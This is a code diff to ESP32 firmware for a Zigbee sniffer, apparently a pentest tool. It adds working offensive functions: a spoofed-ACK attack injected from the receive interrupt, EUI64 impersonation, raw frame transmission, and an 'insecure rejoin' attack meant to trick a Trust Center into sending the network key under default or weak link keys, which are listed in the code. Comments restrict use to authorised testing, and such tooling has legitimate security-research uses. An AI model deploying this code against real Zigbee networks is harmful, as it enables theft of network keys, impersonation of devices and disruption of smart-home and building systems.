@@ -50,9 +50,21 @@ static const uint8_t ZB_TCLK_EISY[ZIGBEE_KEY_LEN] = {
   0x01, 0xA4, 0x10, 0x62, 0xBF, 0x9E, 0xAD, 0x7A,
   0x8F, 0xE7, 0x2A, 0xBD, 0xB6, 0xF8, 0x18, 0x83
 };
+// All-zeros and the zigbee2mqtt "sequential" test TCLK, both seen on
+// misconfigured networks. Ported from C6_zigbee.
+static const uint8_t ZB_TCLK_ZERO[ZIGBEE_KEY_LEN] = { 0 };
+static const uint8_t ZB_TCLK_SEQ[ZIGBEE_KEY_LEN] = {
+  0x01, 0x03, 0x05, 0x07, 0x09, 0x0B, 0x0D, 0x0F,
+  0x00, 0x02, 0x04, 0x06, 0x08, 0x0A, 0x0C, 0x0D
+};
 
 #define ZB_APS_CMD_TRANSPORT_KEY   0x05
 #define ZB_APS_KEY_TYPE_NWK        0x01
+
+// ACK-attack state lives in the RX ISR, so it is static + volatile.
+volatile bool     ZBScan::zb_ackAttackActive = false;
+volatile uint16_t ZBScan::zb_ackAttackTarget = 0xFFFF;
+volatile uint32_t ZBScan::zb_ackAttackCount  = 0;
 
 ZBScan::ZBScan() {
   memset(this->zb_joins, 0, sizeof(this->zb_joins));
@@ -170,7 +182,9 @@ ZbKey *ZBScan::zbFindNetworkKey(uint8_t seqNum) {
 void ZBScan::zbLoadDefaultKeys() {
   if (this->zb_keys_loaded) return;
   this->zbAddKey(ZB_KEY_TCLK, ZB_TCLK_ZIGBEE_ALLIANCE09, 0, "ZigBeeAlliance09");
-  this->zbAddKey(ZB_KEY_TCLK, ZB_TCLK_EISY, 0, "eISY-TCLK");
+  this->zbAddKey(ZB_KEY_TCLK, ZB_TCLK_ZERO, 1, "Zero-TCLK");
+  this->zbAddKey(ZB_KEY_TCLK, ZB_TCLK_SEQ,  2, "Seq-TCLK");
+  this->zbAddKey(ZB_KEY_TCLK, ZB_TCLK_EISY, 3, "eISY-TCLK");
   // Default TCLKs are not "captured" - don't force an SD rewrite for them.
   this->zb_keys_dirty = false;
   this->zb_keys_loaded = true;
@@ -755,6 +769,33 @@ void ZBScan::rxCallback(uint8_t *frame, esp_ieee802154_frame_info_t *fi) {
   if (len < 3 || len > ZIGBEE_MAX_FRAME_LEN)
     return;
 
+  // --- ACK-attack fast path (ZigDiggity "ack_attack") --------------------
+  // Runs in the receive-done ISR/driver context so we can inject a spoofed
+  // MAC ACK before the real target's radio does. If this frame is a data
+  // frame addressed (short) to the attack target and requests an ACK, send a
+  // bare ACK with the matching sequence number immediately. Best-effort:
+  // winning the ~192us ACK window depends on RF geometry and driver
+  // turnaround, and transmit() from this context is not a documented-safe
+  // reentrancy point (first suspect if the radio wedges under sustained use).
+  // frame layout: [len][FC_lo][FC_hi][seq][dstPAN_lo][dstPAN_hi][dst_lo][dst_hi]...
+  if (zb_ackAttackActive && len >= 9) {
+    uint8_t fcLow   = frame[1];
+    uint8_t fcHigh  = frame[2];
+    uint8_t ftype   = fcLow & ZB_FC_FRAME_TYPE_MASK;
+    bool    ackReq  = (fcLow >> 5) & 0x01;
+    uint8_t dstMode = (fcHigh >> 2) & 0x03;
+    if (ftype == ZB_FC_FRAME_TYPE_DATA && ackReq && dstMode == ZB_ADDR_MODE_SHORT) {
+      uint16_t dst = (uint16_t)frame[6] | ((uint16_t)frame[7] << 8);
+      if (dst == zb_ackAttackTarget) {
+        // Bare ACK: len(1)=5 | FC(2)=0x0200 | seq(1) | radio appends FCS(2)
+        uint8_t ackBuf[4] = { 0x05, 0x02, 0x00, frame[3] };
+        esp_ieee802154_transmit(ackBuf, false);
+        zb_ackAttackCount++;
+        // fall through: still queue the frame so it shows in the sniff log
+      }
+    }
+  }
+
   ZbSnifferFrame sf;
   sf.len     = len - 2;                  // strip the 2-byte FCS
   sf.rssi    = fi ? fi->rssi : 0;
@@ -790,6 +831,16 @@ bool ZBScan::zbRadioInit(uint8_t channel) {
   esp_read_mac(eui64, ESP_MAC_IEEE802154);
   esp_ieee802154_set_extended_address(eui64);
   esp_ieee802154_set_channel(this->zb_channel);
+
+  // Record our own EUI64 for the TX / simulation path. esp_read_mac() returns
+  // canonical (printed, MSB-first) order; build the big-integer form that
+  // matches srcExtended/dstExtended, and keep the raw bytes to restore the
+  // radio's programmed address after a spoof. (Mirrors C6_zigbee init().)
+  this->zb_ownEUI64 = 0;
+  for (int i = 0; i < 8; i++)
+    this->zb_ownEUI64 = (this->zb_ownEUI64 << 8) | eui64[i];
+  this->zb_hwEUI64 = this->zb_ownEUI64;
+  memcpy(this->zb_hwEUI64Bytes, eui64, 8);
 
   this->zb_initialized = true;
   Serial.printf("[ZBScan] 802.15.4 radio initialised on channel %u\n", this->zb_channel);
@@ -829,6 +880,316 @@ void ZBScan::zbChannelHop() {
   if (next > ZIGBEE_MAX_CHANNEL)
     next = ZIGBEE_MIN_CHANNEL;
   this->zbSetChannel(next);
+}
+
+// ===========================================================================
+// Transmit primitives (ported from C6_zigbee IEEE802154Sniffer). The 2.4GHz
+// front end is shared, so each TX sleeps the radio, transmits, then resumes
+// RX. FOR AUTHORISED TESTING OF YOUR OWN NETWORK ONLY.
+// ===========================================================================
+
+bool ZBScan::zbSendRawFrame(const uint8_t *frame, uint8_t frameLen) {
+  if (frameLen == 0 || frameLen > ZIGBEE_MAX_FRAME_LEN - 3) return false;
+
+  // IDF transmit buffer: [length byte][frame...]; length includes the 2-byte
+  // FCS the radio appends.
+  uint8_t txBuf[ZIGBEE_MAX_FRAME_LEN];
+  txBuf[0] = frameLen + 2;
+  memcpy(&txBuf[1], frame, frameLen);
+
+  esp_ieee802154_sleep();
+  esp_err_t err = esp_ieee802154_transmit(txBuf, false);
+  delay(5);
+  esp_ieee802154_receive();           // back to RX
+  this->zb_running = true;
+
+  if (err != ESP_OK) {
+    Serial.printf("[ZBTX] sendRawFrame failed (%d)\n", (int)err);
+    return false;
+  }
+  return true;
+}
+
+void ZBScan::zbSetOwnEUI64(uint64_t eui64) {
+  this->zb_ownEUI64 = eui64;
+  uint8_t buf[8];
+  for (int i = 0; i < 8; i++) buf[i] = (uint8_t)(eui64 >> (8 * i));  // on-air LE
+  esp_ieee802154_set_extended_address(buf);
+  Serial.printf("[ZBTX] Own EUI64 set to %016llX%s\n",
+                (unsigned long long)eui64,
+                (eui64 == this->zb_hwEUI64) ? " (hardware)" : " (SPOOFED)");
+}
+
+void ZBScan::zbRestoreOwnEUI64() {
+  this->zb_ownEUI64 = this->zb_hwEUI64;
+  esp_ieee802154_set_extended_address(this->zb_hwEUI64Bytes);
+  Serial.printf("[ZBTX] Own EUI64 restored to hardware %016llX\n",
+                (unsigned long long)this->zb_hwEUI64);
+}
+
+bool ZBScan::zbSendAck(uint8_t seqNum) {
+  uint8_t frame[3] = { 0x02, 0x00, seqNum };   // FC: type=ACK, no addressing
+  return this->zbSendRawFrame(frame, sizeof(frame));
+}
+
+void ZBScan::zbStartAckAttack(uint16_t target) {
+  zb_ackAttackTarget = target;
+  zb_ackAttackCount  = 0;
+  zb_ackAttackActive = true;
+  Serial.printf("[ZBATTACK] ACK-attack armed against 0x%04X\n", target);
+}
+
+void ZBScan::zbStopAckAttack() {
+  zb_ackAttackActive = false;
+  Serial.printf("[ZBATTACK] ACK-attack stopped (0x%04X, %lu ACKs)\n",
+                zb_ackAttackTarget, (unsigned long)zb_ackAttackCount);
+}
+
+// MAC Beacon Request (Cmd 0x07), broadcast - solicits beacons for scanning.
+bool ZBScan::zbSendBeaconRequest() {
+  static uint8_t seq = 0;
+  uint8_t frame[8] = {
+    0x03, 0x08, seq++,          // FC: MAC cmd; dst=short, src=none
+    0xFF, 0xFF,                 // dst PAN broadcast
+    0xFF, 0xFF,                 // dst addr broadcast
+    0x07                        // Cmd: Beacon Request
+  };
+  return this->zbSendRawFrame(frame, sizeof(frame));
+}
+
+// MAC Association Request (Cmd 0x01) to a parent advertising permit-join. We
+// have no short address yet, so we source by our EUI64 with src PAN 0xFFFF.
+bool ZBScan::zbSendAssociationRequest(uint16_t dstPan, uint16_t dstShortAddr,
+                                      uint8_t capabilityInfo) {
+  static uint8_t seq = 0;
+  uint8_t frame[19];
+  frame[0] = 0x23;              // FC lo: MAC cmd, ack request
+  frame[1] = 0xC8;              // FC hi: dst=short, src=extended
+  frame[2] = seq++;
+  frame[3] = (uint8_t)(dstPan & 0xFF);
+  frame[4] = (uint8_t)(dstPan >> 8);
+  frame[5] = (uint8_t)(dstShortAddr & 0xFF);
+  frame[6] = (uint8_t)(dstShortAddr >> 8);
+  frame[7] = 0xFF; frame[8] = 0xFF;                 // src PAN 0xFFFF (unassociated)
+  for (int i = 0; i < 8; i++)
+    frame[9 + i] = (uint8_t)(this->zb_ownEUI64 >> (8 * i));  // src EUI64, on-air LE
+  frame[17] = ZB_MAC_CMD_ASSOC_REQUEST;
+  frame[18] = capabilityInfo;
+  return this->zbSendRawFrame(frame, sizeof(frame));
+}
+
+// MAC Data Request (Cmd 0x04) - poll the parent for an indirectly-queued frame
+// (Association Response, Transport Key). Before association use the extended
+// address; afterwards use the assigned short address.
+bool ZBScan::zbSendDataRequest(uint16_t dstPan, uint16_t dstShortAddr,
+                               bool useOwnShortAddr, uint16_t ownShortAddr) {
+  static uint8_t seq = 0;
+  uint8_t frame[18];
+  uint8_t len;
+
+  if (useOwnShortAddr) {
+    frame[0] = 0x63;           // FC lo: MAC cmd, ack req, PAN ID compression
+    frame[1] = 0x88;           // FC hi: dst=short, src=short
+    frame[2] = seq++;
+    frame[3] = (uint8_t)(dstPan & 0xFF);
+    frame[4] = (uint8_t)(dstPan >> 8);
+    frame[5] = (uint8_t)(dstShortAddr & 0xFF);
+    frame[6] = (uint8_t)(dstShortAddr >> 8);
+    frame[7] = (uint8_t)(ownShortAddr & 0xFF);
+    frame[8] = (uint8_t)(ownShortAddr >> 8);
+    frame[9] = ZB_MAC_CMD_DATA_REQUEST;
+    len = 10;
+  } else {
+    frame[0] = 0x23;           // FC lo: MAC cmd, ack req
+    frame[1] = 0xC8;           // FC hi: dst=short, src=extended
+    frame[2] = seq++;
+    frame[3] = (uint8_t)(dstPan & 0xFF);
+    frame[4] = (uint8_t)(dstPan >> 8);
+    frame[5] = (uint8_t)(dstShortAddr & 0xFF);
+    frame[6] = (uint8_t)(dstShortAddr >> 8);
+    frame[7] = 0xFF; frame[8] = 0xFF;
+    for (int i = 0; i < 8; i++)
+      frame[9 + i] = (uint8_t)(this->zb_ownEUI64 >> (8 * i));
+    frame[17] = ZB_MAC_CMD_DATA_REQUEST;
+    len = 18;
+  }
+  return this->zbSendRawFrame(frame, len);
+}
+
+// ===========================================================================
+// Join a network as an end device (ported from C6_zigbee ZbJoiner).
+// ===========================================================================
+#define ZB_JOIN_POLL_INTERVAL_MS 300
+#define ZB_JOIN_TIMEOUT_MS       8000
+#define ZB_JOIN_MAX_POLLS        30
+#define ZB_MAC_CMD_ASSOC_RESPONSE 0x02
+
+bool ZBScan::zbJoinStart(uint16_t parentShort, uint16_t parentPan, uint8_t cap) {
+  if (!this->zbSendAssociationRequest(parentPan, parentShort, cap))
+    return false;
+  this->zb_joinParentShort   = parentShort;
+  this->zb_joinParentPan     = parentPan;
+  this->zb_joinAssignedShort = 0xFFFE;
+  this->zb_joinStartMs       = millis();
+  this->zb_joinLastPollMs    = this->zb_joinStartMs;
+  this->zb_joinPollCount     = 0;
+  this->zb_joinPhase         = ZB_JOIN_WAIT;
+  Serial.printf("[ZBJOIN] Assoc Request -> 0x%04X (PAN 0x%04X) EUI64 %016llX cap 0x%02X\n",
+                parentShort, parentPan, (unsigned long long)this->zb_ownEUI64, cap);
+  return true;
+}
+
+void ZBScan::zbJoinAbort() {
+  if (this->zb_joinPhase == ZB_JOIN_WAIT) {
+    this->zb_joinPhase = ZB_JOIN_IDLE;
+    Serial.println(F("[ZBJOIN] Aborted"));
+  }
+}
+
+void ZBScan::zbJoinUpdate() {
+  if (this->zb_joinPhase != ZB_JOIN_WAIT) return;
+  uint32_t now = millis();
+  if ((now - this->zb_joinStartMs) > ZB_JOIN_TIMEOUT_MS ||
+      this->zb_joinPollCount >= ZB_JOIN_MAX_POLLS) {
+    this->zb_joinPhase = ZB_JOIN_FAILED;
+    Serial.printf("[ZBJOIN] Timed out waiting for Assoc Response from 0x%04X\n",
+                  this->zb_joinParentShort);
+    return;
+  }
+  if ((now - this->zb_joinLastPollMs) < ZB_JOIN_POLL_INTERVAL_MS) return;
+  this->zb_joinLastPollMs = now;
+  this->zb_joinPollCount++;
+  // Poll the parent (extended-addressed - no short address yet) for the queued
+  // Association Response.
+  this->zbSendDataRequest(this->zb_joinParentPan, this->zb_joinParentShort, false);
+}
+
+void ZBScan::zbJoinProcessFrame(const ZbFrameInfo &info, const uint8_t *raw,
+                                uint8_t rawLen, uint8_t macOff) {
+  if (this->zb_joinPhase != ZB_JOIN_WAIT) return;
+  if (info.frameType != ZB_FC_FRAME_TYPE_MACCMD) return;
+
+  uint8_t cmdId = (macOff < rawLen) ? raw[macOff] : 0xFF;
+  if (cmdId != ZB_MAC_CMD_ASSOC_RESPONSE) return;
+
+  // The Association Response is addressed to us by our EUI64; ignore ones meant
+  // for a different joining device.
+  if (info.dstExtended != this->zb_ownEUI64) return;
+
+  if (macOff + 4 > rawLen) return;   // cmd(1)+shortAddr(2)+status(1)
+  uint16_t shortAddr = (uint16_t)raw[macOff + 1] | ((uint16_t)raw[macOff + 2] << 8);
+  uint8_t  status    = raw[macOff + 3];
+
+  if (status == 0x00) {
+    this->zb_joinAssignedShort = shortAddr;
+    this->zb_joinPhase         = ZB_JOIN_ASSOCIATED;
+    Serial.printf("[ZBJOIN] *** Associated! short 0x%04X via parent 0x%04X ***\n",
+                  shortAddr, this->zb_joinParentShort);
+  } else {
+    this->zb_joinPhase = ZB_JOIN_FAILED;
+    Serial.printf("[ZBJOIN] Association rejected by 0x%04X: %s (0x%02X)\n",
+                  this->zb_joinParentShort, zbAssocStatusName(status), status);
+  }
+}
+
+const char *ZBScan::zbAssocStatusName(uint8_t status) {
+  switch (status) {
+    case 0x00: return "SUCCESS";
+    case 0x01: return "PAN_AT_CAPACITY";
+    case 0x02: return "PAN_ACCESS_DENIED";
+    default:   return "RESERVED";
+  }
+}
+
+void ZBScan::zbJoinPrintStatus() const {
+  switch (this->zb_joinPhase) {
+    case ZB_JOIN_IDLE:
+      Serial.println(F("[ZBJOIN] Idle")); break;
+    case ZB_JOIN_WAIT:
+      Serial.printf("[ZBJOIN] Waiting for 0x%04X (%u polls)\n",
+                    this->zb_joinParentShort, this->zb_joinPollCount); break;
+    case ZB_JOIN_ASSOCIATED:
+      Serial.printf("[ZBJOIN] Associated as 0x%04X via 0x%04X\n",
+                    this->zb_joinAssignedShort, this->zb_joinParentShort); break;
+    case ZB_JOIN_FAILED:
+      Serial.printf("[ZBJOIN] Last attempt to 0x%04X failed\n",
+                    this->zb_joinParentShort); break;
+  }
+}
+
+// ===========================================================================
+// Offensive: insecure rejoin (ported from C6_zigbee ZbAttack). Impersonate a
+// known device and send an UNSECURED NWK Rejoin Request; a permissive Trust
+// Center then transports the network key under the default TCLK, recovered by
+// the key-capture pipeline. FOR AUTHORISED TESTING OF YOUR OWN NETWORK ONLY.
+// ===========================================================================
+bool ZBScan::zbInsecureRejoin(uint16_t targetShortAddr) {
+  int idx = this->zbFindNode(targetShortAddr);
+  if (idx < 0) {
+    Serial.printf("[ZBATTACK] insecure_rejoin: unknown host 0x%04X\n", targetShortAddr);
+    return false;
+  }
+  ZigbeeNode node = zigbee_nodes->get(idx);
+  if (node.ext_addr == 0) {
+    Serial.printf("[ZBATTACK] insecure_rejoin: no captured EUI64 for 0x%04X\n",
+                  targetShortAddr);
+    return false;
+  }
+  uint16_t pan = node.pan_id;
+  if (pan == 0 || pan == 0xFFFF) {
+    Serial.printf("[ZBATTACK] insecure_rejoin: unknown PAN for 0x%04X\n", targetShortAddr);
+    return false;
+  }
+
+  Serial.printf("[ZBATTACK] insecure_rejoin: impersonating 0x%04X (EUI64 %016llX) PAN 0x%04X\n",
+                targetShortAddr, (unsigned long long)node.ext_addr, pan);
+  // Spoof the target's EUI64 so the coordinator trusts the rejoin and any
+  // Transport Key is addressed to that EUI64.
+  this->zbSetOwnEUI64(node.ext_addr);
+
+  if (!this->zbSendRejoinRequest(0x0000, pan, node.ext_addr)) {
+    Serial.println(F("[ZBATTACK] insecure_rejoin: TX failed"));
+    return false;
+  }
+  Serial.println(F("[ZBATTACK] Unsecured Rejoin Request sent. Watch for a captured key."));
+  Serial.println(F("[ZBATTACK] EUI64 still SPOOFED - restore the hardware MAC when done."));
+  return true;
+}
+
+// Build + send an unsecured NWK Rejoin Request wrapped in a MAC data frame.
+// No NWK security header - that is what makes it the *insecure* rejoin.
+bool ZBScan::zbSendRejoinRequest(uint16_t coordShort, uint16_t pan,
+                                 uint64_t spoofEui64) {
+  static uint8_t macSeq = 0;
+  uint8_t frame[ZIGBEE_MAX_FRAME_LEN];
+  uint8_t off = 0;
+
+  // MAC: data frame, ACK req, PAN-ID compression, dst=short, src=extended.
+  frame[off++] = 0x61;
+  frame[off++] = 0xC8;
+  frame[off++] = macSeq++;
+  frame[off++] = (uint8_t)(pan & 0xFF);
+  frame[off++] = (uint8_t)(pan >> 8);
+  frame[off++] = (uint8_t)(coordShort & 0xFF);
+  frame[off++] = (uint8_t)(coordShort >> 8);
+  for (int i = 0; i < 8; i++) frame[off++] = (uint8_t)(spoofEui64 >> (8 * i));
+
+  // NWK: command frame, protocol version 2, security OFF, source IEEE present.
+  uint16_t nwkFc = 0x0009 | ZB_NWK_FC_EXT_SRC;
+  frame[off++] = (uint8_t)(nwkFc & 0xFF);
+  frame[off++] = (uint8_t)(nwkFc >> 8);
+  frame[off++] = (uint8_t)(coordShort & 0xFF);
+  frame[off++] = (uint8_t)(coordShort >> 8);
+  frame[off++] = 0xFF; frame[off++] = 0xFF;    // NWK src 0xFFFF (no short addr)
+  frame[off++] = 1;                            // radius
+  frame[off++] = this->zb_attackNwkSeq++;
+  for (int i = 0; i < 8; i++) frame[off++] = (uint8_t)(spoofEui64 >> (8 * i));  // src IEEE
+
+  // NWK payload: Rejoin Request + MAC capability.
+  frame[off++] = 0x06;                         // NWK cmd: Rejoin Request
+  frame[off++] = ZB_ASSOC_CAP_ALLOC_ADDR;
+
+  return this->zbSendRawFrame(frame, off);
 }
 
 // MAC-header decoder. Ported from IEEE802154Sniffer::_decodeMac(), reduced to
@@ -1062,10 +1423,14 @@ void ZBScan::zigbeeLoop(uint32_t currentTime) {
 
       // Network-key capture: watch assoc responses + APS Transport Key frames.
       this->zbKeyCaptureFrame(info, raw.data, raw.len, info.macPayloadOffset);
+
+      // Active join (if in progress): watch for our Association Response.
+      this->zbJoinProcessFrame(info, raw.data, raw.len, info.macPayloadOffset);
     }
   }
 
-  // Drop stale pending joins (device started a join but no key seen).
+  // Drive an in-progress join (poll / timeout) and drop stale pending joins.
+  this->zbJoinUpdate();
   this->zbExpireJoins();
 
   // When hopping, move one channel each HOP_DELAY*2; locked mode never hops.
